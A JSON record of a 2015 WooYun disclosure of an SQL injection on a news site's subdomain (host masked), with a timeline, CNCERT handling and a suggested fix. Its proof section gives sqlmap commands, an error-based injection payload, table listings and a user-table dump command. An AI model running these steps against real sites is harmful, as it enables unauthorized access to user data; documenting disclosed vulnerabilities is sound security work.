{"id": 78408, "wybug_id": "wooyun-2015-0160471", "wybug_title": "北青网某分站存在SQL注入漏洞", "wybug_corp": "北青网", "wybug_author": "Joker_C", "wybug_date": "2015-12-17 01:14", "wybug_open_date": "2016-01-28 15:25", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["报错型注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： url中的参数没有过滤导致了注入问题 详细说明：  漏洞存在的url为 **.**.**.**/cgi/news.php?id=20注入点为id 在最后加上'后 会出现报错回显 \nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 select * from news where d_id=535955'\n，因此可以用报错注入sqlmap可快速地注出数据   漏洞证明：  \nsqlmap -u \"http://**.**.**.**/cgi/news.php?id=\"--technique E --current-dbParameter: id (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=--technique AND (SELECT 1481 FROM(SELECT COUNT(*),CONCAT(0x7176787171,(SELECT (ELT(1481=1481,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)[16:16:38] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.29back-end DBMS: MySQL 5.0[16:16:38] [INFO] fetching current databasecurrent database:    'web_2_1'\n得到数据库名后继续获得表信息\nsqlmap -u \"http://**.**.**.**/cgi/news.php?id=\"--technique E --tables -D web_2_1Database: web_2_1                                                              [40 tables]+-----------------+| global          || user            || article_from    || auto_ad         || auto_bang       || auto_beauty     || auto_big_brands || auto_bqyc       || auto_brands     || auto_cars       || auto_comment    || auto_index      || auto_photo      || auto_subbrands  || auto_zhuanti    || baojia_4s       || beauty_album    || beauty_index    || blank_data      || complain        || dealers         || fenlei          || fenlei_beauty   || friend_links    || index_car2013   || market_cars     || navcode         || navigation      || news            || news_top        || polymorphic     || sp_t28          || sp_t32          || sp_t33          || sp_t34          || sp_t35          || sp_t36          || temp            || tempdef         || tuijian_top     |+-----------------+\n接着爆user表可获得用户信息\nsqlmap -u \"http://**.**.**.**/cgi/news.php?id=\"--technique E -T user  -D web_2_1 --dump\n用户爆得太长了就不贴了   修复方案：  过滤  关闭错误回显   版权声明：转载请注明来源 Joker_C@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-21 18:46 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给北京分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}